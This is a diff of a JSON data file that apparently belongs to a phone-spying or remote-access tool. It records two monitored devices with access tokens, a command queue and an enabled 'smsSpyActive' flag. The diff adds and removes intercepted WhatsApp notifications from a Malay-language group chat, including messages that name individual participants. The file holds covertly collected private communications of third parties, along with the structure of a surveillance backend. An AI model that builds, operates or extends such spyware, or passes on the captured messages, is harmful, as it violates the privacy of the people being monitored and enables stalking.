@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042293966,
+    "lastSeen": 1775042296945,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12477 pesan): ~ Bot",
+        "content": "📷 @⁨~Noraini⁩ telah keluar dari main botwiee bersama",
+        "time": "01/04 19:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042298511
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12476 pesan): ~ r",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:05",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041520942
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14678 pesan dari 11 chat",
-        "time": "01/04 19:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041520822
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042294866,
+    "lastSeen": 1775042297857,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12477 pesan): ~ Bot",
+        "content": "📷 @⁨~Noraini⁩ telah keluar dari main botwiee bersama",
+        "time": "01/04 19:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042298498
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12476 pesan): ~ r",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:05",
         "pkg": "com.whatsapp",
         "receivedAt": 1775041520963
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14678 pesan dari 11 chat",
-        "time": "01/04 19:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775041520897
       }
     ],
     "galleryPhotos": [],
